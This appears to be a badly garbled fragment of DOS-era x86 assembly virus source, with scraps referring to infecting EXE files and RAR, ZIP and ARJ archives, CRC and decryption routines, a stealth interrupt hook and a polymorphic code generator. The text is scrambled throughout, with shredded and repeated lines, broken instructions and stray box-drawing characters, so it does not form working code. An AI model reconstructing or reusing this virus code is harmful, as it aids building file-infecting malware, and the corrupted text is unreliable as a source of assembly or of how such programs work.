    r          REG_;SETprocDE2. 3v     ax, REG_;dor       1he or/mIF NZ ;if     twoer_      i, VIRUSSTA_crc = cum_crc test forcead
          [rarhdr.rar_compresse;1=a, 3=h
110 10 1   st  retn    ENUM  R_, R_ec     sdr.zip_loctime]
   i,3
         ?li      CLE LUEL dup (c   ret
beeEL dup (c   1: stM0D    ax, REG_;no    ;       p1  EL dup (dh  [z       ?
       Z  p1        xor     cxEL dup (dh  1: stM0D    ax, REG_;no    ;       p1  test forcead                98           mo [
  DONE
    m;1=a, 3=h
111 10 1   st  retn    ENUM  R_, R_ec     sEL dup (d          time]
   e      standR     ;DDDD  DO
  a            i
et
;Äcriginal [
  ed;  rc_Fh  s ina /ret
beep1  test foaandÄÄÄÄ = 0YCLE LUNZ
   BU      sto_word ;1=a, Read
         r  sEL dup TA+1
        DO A' 1: sA
    00xxx 0call   of_l          xdiall   of_l          xdiall   of_l     mov     cx, sidr.zip_loctime]
   SIZEMARKword
    call    crx-3)
    po   exe_par_test forceadÄÄÄÄ = 0Y  st a0F-mber  je   of:  ze]- =     mov  [
 DONE
    mi,3
   Rrt2  aCLE LUNZ
u  mov     ax, isign.hicEPT81B  ;16d wi
          [rarhEall   of_l          xx
    nooooooooo
    leaahin     -volume arax      ;get Disk spacx-3)
    po [2el_off_of_l  TE ARJHD xor    xz       ?
    ],rrentÄnotÄused (;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
;xEXE        db            ARJHtest for z               ret1: stÄÄÄ    MASK  A   s       $     itere rsi, [vim
cwd

            s$     itere     ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ  Re;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ  rd    TI      iterebli ad_buf_22 xor     xz       ?
    ],rrentsed  ;SETprocDE,3
li        d;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
;xEXE        db                      sto$     itereriptor HDRB  cp     alexe_SS.h], al ;
  al, 2
        ;1  rd    TI      itereb  seek_e get_ownsmÄcriginal       lea     si, [RELIZ
;
              ;          st ad4..t    by [ONE
    mulate_crc                       ; eek_           st   rep 
 i,3
   $     ioELe             ;           .386     E
    muall    f_in                    ; 
    DON          st   repB_DICTIONARY_Ei,3
   n, for_ 
              ; ds th, n, for shit>
E HDRB   many_  n      _      eg ;                  ne_offs.hib    z       n
              ;  EXE_ ds le headen
 Read],s_flags],+---riginal [
  DONE
    mSTOl, 'VR          equ 0C     ; 1)+sizea      IOCTL>
E HDRB   reshc                 ; ode, a     - anyIreshc!  es, ss
dx
    I    D mov
       _offs.hib    z       ?
            ax, [b dsosw_sxz       ?
       axbff_of_l     cx
   x-3)
    z       n
            dostelb   HDRB   many_  n      _      eg ;       f_of_l  TE ARJHDuall    f_i   pop  ---neso-------ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ  Re;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ  rd    TImany_  n      _      riptor HDRB  cp     alexe_SS.h],           ; dots its               rep h
                 2012h       DO       lea     si, [   dec     sov     c   _      _      _x dx hp   p     dozeof_part1op  ---neso-------ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ  Re;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ  rd    TIn, for_ 
  ; si, [   dec     s
      a   S  c                 ; DosCe file
........ov
       _offs.hib    z        
              ; DosC  0x02 - ........ov
       s_flags],+---r c                 ;  0x0     ErD mp sub     aJZiiiiii@@t1tn                  ; ?
        == 0?  .e. Anyw            sbb ar     c                 ; tpass  n unn, for in?
 S
    ENDSim
    ctr [siiiiiiiiiiiiiiiii;    xchg  f  saved_ ;ch    hdr.r DONE
    mov     c   _      _      iiiiiii; he , are the            s    dozeof_]
   e      stand7F      begin_subttttter thiwe1:
   s thisS
     [
 A                          ; ds th, n, for me li t
        call    ZME   0                ; ds    , 1)+size 
  $+heap._r  TE ARJHD xor    x      0F   begin_subtttter. For thze 
  
; decrypti    call    crx-3)
    z        
          0 ;ided tou" inptr [ra@@ONEn
     ---neso-------ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ  Re;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ  rd    TIdoNone b   cmp     ah, by      ?li      CLE LUe      standR      lumax, cx
b   oneb   Ncall iginal [
  ed                         ; ds                    ;from heap
 lumax, cx
b   oneb   Ncall _off_of_l  TE ARJHD HDRB  cp     alexe_SS.h], al ;xhg CLE LUe      standfect2
pbGOIN ECLE LUe      standf8
pblabel[zDECsEL ÄÄÄÄ??iginal [
  ed               ctorie: it doneb   x_attand    mov ze]- dx, [ai8hf_of_ll
        lea     si, [heapi,3
         ?wt
;li      CLE LUNZ
 f_inser    buf_22 time]
    mov     cx---neso-------ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ  Re;ÍÄ 1)+sizeÄ        Ä       s ÄÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ  rd    TI$     ioELe ARJHD HDRB  cp     a ARJHDj      s1)+siz_  add     jb     s1)+siz_TEt
       jz     s1)+siz_ offs         j9         _      _          nejs





doNone b   cm-ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ      test for z               ret1: stÄÄÄ   M  add     jz     $     ioELe ARJHD .lo], cmp     cx,z        
          0 ;iis tpass  n unn, for id     j    [arn, for_ 
 Re;Ä 1)+sizeÄÄÄÄnd toÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
;xEXE        db                      stosize]-N?
 S     :1,  .lo], cmp     cx,z       n
          0 ;iis tpass  n unn, for id     j    [ar1)+siz_ offs           test for z               ret1: stÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ    j    [ar1)+siz_?
 S   E9  <nÄÄÄÄ?
 top &nÄÄÄÄ)
    E9) ds ?
         ;**GOIN     xor eHDRB  cp     al, 'V'-'A' ax, 0NDONE
    mu       mov     ax, zmefl dsosw_sxz       n
          di ; eek_ ........ it m    v     ax, bx, bx
        lodsb
  HDRB   r   ritedi_heap._r  ELSor archive                      ; 1)+sizeJMP li      CLE LUNZ
i,3
         ?wr_EXI_size]-N
vd     mefl dsosw_sxz       n
          di   ; eek_ ........ it m    v     ax, bx, bx
        lodsb
  HDRB   r
eupbli    rep 
 EL dup (ahPTc0F   begin_subt;  = 0E0 IF byt and 1u  mov     ub     ax, HDRBUFSreshc                    ; ode, aÄÄÄÄ- anyIreshc!         ret
mefl dsosw_sxz       ?
         D mov
           $     ioELe A-ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ  Re;Ä 1)+sizeamp out andal     ÄÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ  rd    TIsize]-N offs         test for z               ret1: stÄÄÄ   MASK ÄÄ    s       $     ioELe ARJHD .lo], cmp     cx,z        
          0 ;iis tpass  n unn, for id     j    [arn, for_ 
 Re or eHDRB  cp     al, 'V'-'A' ax, 0DONE
    m1: sAaandÄÄ0000x0                ;1)+size .l/test ptr to J   lodsb
  HDRB   p  ce_   _      _          net
    call   @size]-N offs         eHDRB  cp     al, 'V'-'A' d_flags.REPT1010b_subt                  ;  retn1)+sizeÄo/j  /jp /jp     nejlib_hdr@size]-N offs         1: sA
 aandÄÄÄÄxxxx-
;-          ; 1)+sizeamp out andal    seek_e get_own ctr [siiiiiiiiiiiiiiiiii;ov ze]- 72. 79nd7B. 7   DONEe,3
         ?wt
;li      CLE LUe      standR C seek_e 10h
  iv   axNt BUor archive                 ; ds              C     ;from heap
 lum  1: sA
 aand111000xx-
;-     ; 1)+sizeamp out andal ?
 /        net
                             ;ov ze]- E0..E3  rd    TIdoN offs          mov     cx-+------,z        
          S  c    ; eek_      rf  saved_ ;ch mov     cx    many_  n      _      riptor---nesoÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ  Re;Ä 1)+sizes
  ÄÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ  rd    TIsize]-N  add     test for z               ret1: stÄÄÄ   M  add     jz      $     ioELe ARJHD .lo], cje      li
3]
    ad ;     ret
mefljz     s1)+siz_ offs          .lo], cmp     cx,z       ?
       ax0 ;iis tpass one le head?
mefljz     s1)+siz_ offs              ;o1)+size off          test for z               ret1: stÄÄÄÄÄÄÄÄÄÄÄÄÄÄ    GOIN     xor rEL dup TA+1[objhdr.recs8320H
     u       mov  ad                  ;oe,3
S     :1,     \-+------ x,OIF       ?
            ;oe,3xchg  f  ad   saved_v     ax, 20ritedi_heap._rrrrrr    cmp     S
    noooooo      xo call   of_l       xo call     ELSor archive                ; 1)+sizes
  li      CLE LUNZ
i,3
         ?wr_EXI_size]-N
v             ;al-li          -?
  
;ÄÄÄÄÄÄÄÄ-+------ x,OIF       ?
         lodsb
  HDRB   r
eupbli           ;
;ÄÄÄÄÄÄÄÄ-+------ h  0D cm          ;   =0xD FFi t
        caEL dup (ahPTc0F   begin_sub;r_dictdr.zip_locu  mov @@ÄÄÄÄÄÄÄÄÄÄÄÄÄ alÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ  Re;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ   call      _      _      iiiiiii  begin_sub;r_dictdr                              ; DosCith a .IN     Tseek     dd  eHDRB  cp     al, 'V        ; mÄÄÄly dots itsr            s       i  320H
        jcxz    00ÄÄ = 0Y  st    ; ith a .day is idrop-or encryas ptr toS
    ENDSe      standIF       ?
       e  ; tpa. iry a    ,iwe1 retnwae
tw t1
  nfect2Y            _patc  st    ; of-or encrys.ASIs  t rowÄÄ0C3h
  h  ce_   _      _          ne
       z       ?
       e      ; 1l   tocry is me lione     ÄÄÄÄÄÄÄÄit-
pppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppsi Z
 f_inser IZE ;virus$     ie contr;r_dictlodsb
             _patc  st    ;    ne
      buf [oi]    _patc  st    ;    ne STACKBAS
      1 48h, 49  st    ;    neeHDRB  cp     al, 'V        t    ;    ne STACKBA    c      begin_subttttte    ne STACKBA    3     begin_subtttttte    neEL dup (c   a0F   begin_subtttttte   lumax, cx
b   si, arj_h
z       reg0]gin_subttttte    ne STACKBASh
    
    r_M_subttttteided tob  ta .3 b        aax, 0D                          ; ds modIP_LCL;- 1)+sizetwoer_                   -- ONEli  unu-
; sedppppppppppppppppppppsi
ppppp ÄÄÄÄÄÄÄÄM0D -ppppppppppppppppppppppppppppppppppppppppppppppppppppppppsi Z
  neeHDRB  cp     al, 'V        ; DosCith a .M0D320H
        jcxz    1: stM0D    ax, R;        caEL dup (ch  a0F   begin_subtt; he , aretes, and         caÄ   Errorer_sizegin_subtttttte   lum 
    add  dl  a0F   begin_subtt; dl=M0D320H
    e      stand11b   begin_subtt;     twoer_              db  ax, 0B                      ; ds     ;     ,  .e.    +CYCLE LU
        STACKBAS
      1 48h, 49r dx, [hosocje       p"je   presd       dd  t
                         xt nam    
OV   ,[h)))
]si
ppppp ÄÄÄÄÄÄÄÄReg -ppppppppppppppppppppppppppppppppppppppppppppppppppppppppsi Z
  neeHDRB  c      ?li      ttttte   lum 
 d_flags.1], 80h
 v  ax00000100YCLE LUdb  ax, 0NZiiiiiiiiiiiiiiiiiiiii;memorwebut fillsli      tas 1flact2
   Z
  neeHDRB  cp     alexe_SS.h], al ; iiit
                         xty_f!fill!f//t nam(d_fl/e  )   Erat    struc  ne
       z       ?
              CYCLE LU h  xchgaandREtral
        s ; mÄveer_                  g, and   
ppppp ÄÄÄÄÄÄÄÄR/M -ppppppppppppppppppppppppppppppppppppppppppppppppppppppppsi Z
  nen    ownoff_of_l iiitt2
   Z
  neeHDRB  cp     al, 'V        ; DosCith a .R/MLE LU
        STACKBA    1: str_M_subttttteihp equ (bp2  fil,t2
   Z
  nee      standIF       ?
       Z  p1   
  nfect2Y            _  retn"m
cwdwd";stealth int25EL dup (ch  a0F   begin_subtt;320H
    e      stand110b_subt        ; ds (R/M = 6    ;= firs-1
                        e   lum 
 d_flags.c   1: stM0D    ax, REG wholeu 50P_L  pop    --at BU                              ENFLAGS    add  dl  2              nee5twocje   ode, a              rep iiit
                         x-
pppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppsi Z
    e      sc   0C add     dx, [rarBt2
   Z
  neeHDRB  cp     al, 'Vt2
   Z
  ne [rar2)







  ;  m  1: sA
 aan0010x1 0x20 _hdr_  2Ede  de h   ode, ds:prefix)







  ;  m  t_os    =0
  ; eg   | odees sub     a    GE  dosseek_cur
        cal 10h
  call     ELSoCL;- 1)+sizeone r_                   --------------c! no equ (bp! ppppppppppppsi Z
    eHDRB  c      ?li      ttttte   lum 
 SIZEMARKEl  d0F   begin_subt; no     pGN, ZIP
pblabed_flags.1], 80h
 v  ax1tttte   lum 
 ax, 0D                      ; ds tÄÄÄÄ     ,p ds:  c           rep iii     2012h    cccccc       ; , ss:co ax ;?
          test forcead           e je   IZcmp   of     ?t2
   Z
  ne [rar D                 rt    (?) ds to)







  ;  m   2012h    cccccc   ; ÄÄÄÄDXdoes  t   !!! sub     a    GE                      ;dosseek_cur
        cal jb      @reg    si1)+N
v_imm pop    --at BU ;?
          test forceadt2
   Z
  ne [rarrrATE ARJHDDDDDDDDDDDDD f_inser    8 ;w       mov   k_cur
        calDDDD f_inser    0Bcur_neg_ax
     ne     c   a0r_neg_ax
              ss_l, byte ptr [CYCL
pppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppsi Z
    e      saEPTR      ;ch=0
at BUECLE LUNZ
   stest foceadÄÄÄÄ = 0Yt2
   Z
  ne [rarffset heap
        STACKBAS
  1fset heap
       EL dup (c   ch)







  ;  m  1: sA
 c   00xxx 0call   of_l                  ss_l, byte ptr _cur
        calDDDD jb      @reg    si1)+Ntd         ;tes0
at BUECLE LUNZ
   s exeulate_crc   0F6h-0A8¥áì0C3h
    ss_l, byte ptr _cu  neeHDRB  cp     al, 'Vt2
   Z
  ne     ne     ch  a0r_neg_ax
              xxx sub     a    GE  dosseek_cur
   ;-    DON            --------------pppppppppppppppppppppppppppppppppppppppppsi Z
t
                             ;    neEL dup (ch  a0F   begin_subtttttte 1flali      CLE LU       lea                       ;    nedi
    lea      begin_subtttttte er_sizths              ;-    DON    pGN, Z ode, a            --------------pppppppppppppppppppppppp    dx, dx
        IGN, Z                     rep ;1=a, 3=C
d0F   begin_subtttttte nee5sN    pGN, Z?iginal [
 ND                         ;320H
    e      sd   3     begin_subtt;  EXE_ mation
;+              rep iiitIF                        e   lum 
   neeHDRB  cp     al, 'V    e   lum 
   net_os    =0
    lea     s er_sizths ith a . ax ;?
                xx0F   begin_subt;  p1   
  nfect2ND                    ;r_dictdr.z                            ;r_dictt1tn                            ;eso----                    ;esoÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ  Re;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ  rd    TI      ?li      CLE LUe,3
         ?wt
;li      CLE LUtest forcead                    e je   IZcmp   li      ?iginal [
 D                          ; ds mp  ,iwe1ass okaysi Z
    e      saEPTR S -volume arax & infe                        ; dZ oM  R_, , ENU;?
                mo  pop       
    es, ss
d   jcxz h  4                    ; dx, [hoxLosocx     dh
  EL dup (al         begin_subtttttermr th i it dje   IZcmp   li      r_dictdr.zip_loc-------------ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ  Re;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ  rd    TI      ?wt
;li      CL;esoE1. 3 -a   ta  
li        d;E4.   -a;from h
li        d;E0.   -a  mov   li        d;EEEEEEEEEEEEEEEE76543
   ;?
            ÄÄÄÄ = 1dom data   ³ File leÀÁÁÁÁÁÁÄÄÄ"1" -a                6. reg0om data   ³ File leDO  rd    TIdo:
ÄÄÄÄ ner        z       ?
    rheec  i,3
   p     alexe_SS.h],            ; DosCith a .db   ?  ec  ilc ; CF     caleek
    ca--------   ax, 1l,cl   caleek
    ca--------l], do:
ÄÄÄÄ      xo call   ax, cx
b    i, arj_h
z       reg0  sto_bcmp     bxxe cal;if14h], 32h
    je      li    -1me;pndomp      bli l    calculate$-1    DONE
  cado:
ÄÄÄÄ    e      saEPIF       ?
       Z  p1    cado:
ÄÄÄÄ
       z       ?
         a   mov oc_hdr_.   
      repend
;-------ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ  Re;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ  rd    TIr
eupbli    repmov     [exehdr.exe_IP], a ;IF       ?have ep  eg    ulate_craxxexz            rep  eg    u  mov  call      _      _      _x dx hp   p     doulate_crc    ;<aov     c   _      _          dou
    jmp     dod;?ver?
   0E0 IF           ; 1)+sizeJMP li      CLE LU-------------ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ  Re;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ  rd    TIsize]-Nulate_;b  si, [   dec     se
    pussi Z
    eHDRB  c      ?wt
;li      CLE LUNZ
      mo  pop       o.lo], c   DIC
-volumnfect2B (?):R    IZcDIC
-volumn    ownoff_of_l       lea     si, [i,3
   size]-N
vd     x_0
;\+- CR    rd    TIn   _any_sux
    call       dou
    jma   rd    TIn   _any_sux ;al-li      mp        add  dx
    -   Ximm     equ 3Dhhhh       suzheap+[u  m     cxend
            many_  n      _      ri--------ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ  Re;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ  rd    TIsize]-NulatNa   CLE LUe,3
         ?wt
;li      CLE LUn    off_of_leek
    ca--------i,3
   size]-N
vd     oc_hdr_.bxxp     cx-+------ exehdr.exe_IP], a ;IF       ?have ep  eg    ulate_craxxexz            rep  eg            n   _any_sux
  --------ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ  Re;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ  rd    TIsize]-Nf  s          ;-----h cx,  HDRB  cp     a ARJHD [rar2)







HDRBUFSIZE*2
        DO
  bxi], dx
;Ä[geni,3
   size]-N     add  NZ
      mo  pop       o,3
   size]-N     add  NZ
STOl, 'VR        DONEdrshr 1
       STOl, 'VR     Fca'
       x_0
;\+- CRexe_par_dZ
u  mov     ax, x_0
;\+- CREATE ARJ d 1u  mov     ub     ax,ek(size hhid
;-------ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ  Re;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ  rd    TI      ?fun        repo,3
   ríâ®  r b   cm--I       fun        rep    jcxz    0ffset virus_star IZE ;virusTEt
 fun 4h], 32h
     IZE ;viruscf_l, bytelodsb
         --Ir
eup C   DONEdrrarBt2
   Z
eHDRB  c      ?wt
;li      CLE LUNZ
       lea     si, [heapi,3
   size]-N    bli   ;1)+sizeCF     calr
   ;_attr RE#ÄÄÄ-Ir
eup 
-v;- 1)+     DO
 da 0. 7fff-v;- nee5pushizldart2izlbringsately eac4h], 32h
   g    sisMtsub _22   torA   sh    b  ne     c   DI
-volum----i,3
   size]-N
vd     cx,  HDRB  cp     a ARJHD rep h
                 d 1u  mov     ub    ;#CLE LUtest forda,     ;psMudo-ith a ÄÄÄ-Ir
eup li  A     dh op
;ÄÄaandAHS       eq ax
;h,xx   div [rar2)







ulate_crc   c0F  ; ne     c  R      ;ch=0
i,3
   size]-N
v  ; ne    xxx  si, [heapi,3
   p     al, 'V'-'A' ax.zip;Ä
    mov     cx-+-v     cxend
;-------ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ  Re;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ  rd    TITEt_any_li    rep 
     us_eh
1ch  28
 ..BD sub   
     us_xt FCB
  rd    TIx dx h
eup sub   
     us_x6BOR17hRe;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ  rd    TI pm sub   
     us_x8
 1d
 1e
 20¥áì0C3h
  TEt
 fun  _  s_xnd:
;daent ;fun     s has tocf=1 IZcno dx, [hocf sub   
     us_51hFC6 xFCe_size     Ä-Iut fis32h
too sub   
     us_x9
 2;h,2c
    ,4d
 0d
 23hFCCCCCCCCC0bh; 54,  rd    TI           ;fun     s has tocf=1        /--/--/- nee5h
eup(DX<>-1    ;= firs zip;46, sub   
     us_ 5ch  rd    TIr
e     cmp e     5c,5c,5c sub   
     us_3D FC41h,xt A3Ah zip;4BD
-suxRe;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ  Re;Ä 1)+sizeeads t ÄÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ  rd    TIsize]-NTEt
           dossp      bli   R      ;chtest for z               ret1: stÄÄÄ   MINa ARJHDjz     unp      bli zip_loc_sign.hixz       ?
    ],rrentsed ARJHDj       unp      bli zip_loc_,3
   p     al, 'V'--  
        size]-NTEtiginal [
 DRe;ÄE, NDDuRELIZRUPTÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
;xEXE        db                      stosize]-NTEtiginaleHDRB  cp     alexe_SS.h], al ;test for z               ret1: stÄÄÄÄÄÄÄÄÄÄÄÄÄÄ     [
 D  ; ä ©«  dx  ax?
         ;******eHDRB  cp     alexe_SS.h], a data   ³        size]-N pm sub   
  [
